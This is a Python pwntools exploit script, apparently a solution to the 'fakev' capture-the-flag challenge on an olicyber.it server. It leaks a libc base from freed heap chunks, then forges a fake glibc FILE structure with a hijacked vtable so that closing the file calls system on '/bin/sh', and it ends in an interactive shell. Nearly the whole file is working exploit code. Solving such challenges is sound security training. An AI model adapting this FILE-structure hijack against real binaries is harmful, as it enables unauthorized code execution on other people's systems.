#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF(args.EXE or 'fakev')
context.terminal = ["alacritty", "-e", "zsh", "-c"]

host = args.HOST or 'fakev.challs.olicyber.it'
port = int(args.PORT or 11004)

if args.LOCAL_LIBC:
    libc = exe.libc
else:
    libc = ELF('libc.so.6')

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
define print_nodes
  set $cur = *(void **)0x602248
  while $cur != 0
    x/2gx $cur
    set $cur = *(void **)($cur + 8)
  end
end
continue 
'''.format(**locals())

io = start()

def open_file(index):
    io.sendlineafter(b": ", b"1")
    io.sendlineafter(b": ", str(index).encode())
     
def read_file(index):
    io.sendlineafter(b": ", b"2")
    io.sendlineafter(b": ", str(index).encode())
    return io.recvline()

def close_file():
    io.sendlineafter(b": ", b"4")

# --------------------------------------------

for i in range(1, 9):
    open_file(i)

for _ in range(1, 9):
    close_file()

leak = read_file(1)
main_arena = u64(leak[8:16])
libc.address = main_arena - libc.sym.main_arena - 0x60

log.info(f"libc_base: {hex(libc.address)}")

for i in range(1, 10):
    open_file(i)

binsh = libc.address + 0x001b3e9a
choice_string = 0x602100
vtable = libc.address + 0x3e82a0
IO_str_overflow = vtable - 0x3a8
fclose_vtable_entry_off = 0x88

fp = {
    "_flags":             p64(0x2000), 
    "_IO_read_ptr":       p64(0x00),           
    "_IO_read_end":       p64(0x00),           
    "_IO_read_base":      p64(0x00),           
    "_IO_write_base":     p64(0x00),           
    "_IO_write_ptr":      p64((binsh-100)//2), 
    "_IO_write_end":      p64(0x00),           
    "_IO_buf_base":       p64(0x00),           
    "_IO_buf_end":        p64((binsh-100)//2), 
    "_IO_save_base":      p64(0x00),           
    "_IO_backup_base":    p64(0x00),           
    "_IO_save_end":       p64(0x00),           
    "_markers":           p64(0x00),           
    "_chain":             p64(0x00),           
    "_fileno_and_flags2": p64(0x00), 
    "_old_offset":        p64(0x00),           
    "_shortbuf_pad":      p64(0x00),
    "_lock":              p64(choice_string + 0x10), # ptr to a writable NULL address
    "_offset":            p64(0x00),           
    "_codecvt":           p64(0x00),           
    "_wide_data":         p64(choice_string + 8), # address containing this struct in the global variable used by get_int()
    "_freeres_list":      p64(0x00),           
    "_freeres_buf":       p64(0x00),           
    "__pad5":             p64(0x00),          
    "_mode_unused2_1":    p64(0x00), 
    "_unused2_2":         p64(0x00),           
    "_unused2_3":         p64(0x00),           
    "vtable":             p64(IO_str_overflow - fclose_vtable_entry_off),  
    "alloc_buffer":       p64(libc.sym["system"])   
}

payload = p64(ord('4'))
payload += b''.join(fp.values())
io.send(payload.ljust(0x100, b'\x00'))

io.interactive()

